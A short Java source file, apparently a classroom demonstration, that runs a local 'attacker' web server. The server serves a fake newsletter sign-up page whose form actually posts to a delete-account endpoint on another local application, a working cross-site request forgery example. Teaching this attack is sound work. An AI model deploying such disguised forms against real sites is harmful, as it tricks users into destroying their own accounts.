package se.plushogskolan;

import io.javalin.Javalin;

public class CSRFAttackerServer {
    public static void main(String[] args) {
        Javalin app = Javalin.create(config -> {
            config.enableDevLogging();
        }).start("localhost", 7777);

        app.before(context -> {
            context.contentType("text/html; charset=UTF-8");
        });

        app.get("/", context -> {
            String html =
                "<!DOCTYPE html>" +
                "<html lang='en'>" +
                    "<head>" +
                        "<meta charset='UTF-8'>" +
                        "<meta name='viewport' content='width=device-width, initial-scale=1.0'>" +
                        "<title>Newsletter</title>" +
                    "</head>" +
                    "<body>" +
                        "<form method='post' action='http://localhost:7000/delete-account'>" +
                            "<p>Please sign up for my interesting newsletter!</p>" +
                            // We don't actually care about the user's email address, so no input name needed.
                            "<label>Email address: <input type='text'></label>" +
                        "</form>" +
                    "</body>" +
                "</html>";
            context.result(html);
        });
    }
}
